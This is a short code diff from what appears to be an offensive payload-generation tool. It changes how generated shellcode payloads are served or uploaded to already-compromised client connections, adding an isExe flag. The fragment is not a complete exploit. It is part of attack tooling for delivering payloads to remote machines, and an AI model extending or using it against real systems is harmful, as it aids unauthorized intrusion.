@@ -83,7 +83,7 @@ def GeneratePayload(ez2read_shellcode,payloadname,shellcode):
     CleanUpPayloadMess(payloadname)
     from menu import clientMenuOptions
     if len(clientMenuOptions.keys()) > 2:
-        DoClientUpload(payloaddir,payloadname,powershellExec=None)
+        DoClientUpload(payloaddir,payloadname,powershellExec=ez2read_shellcode,isExe=True)
     else:
         DoPayloadUpload(payloadname)
 
@@ -102,7 +102,7 @@ def DoPayloadUpload(payloadname):
     elif want_to_upload.lower() == 'y' or want_to_upload.lower() == '':
         FUNCTIONS().DoServe(FUNCTIONS().CheckInternet(), payloadname, payloaddir)
 
-def DoClientUpload(payloaddir,payloadname,powershellExec):
+def DoClientUpload(payloaddir,payloadname,powershellExec,isExe):
     use_client_upload = raw_input(
         '\n[*] Upload Using Client Connection? [y]/n: ')
     if use_client_upload.lower() == 'y' or use_client_upload == '':
@@ -120,4 +120,4 @@ def DoClientUpload(payloaddir,payloadname,powershellExec):
             except:
                 continue
 
-        clientUpload((payloaddir + '/' + payloadname),clientconn,powershellExec)
+        clientUpload((payloaddir + '/' + payloadname),clientconn,powershellExec,isExe)
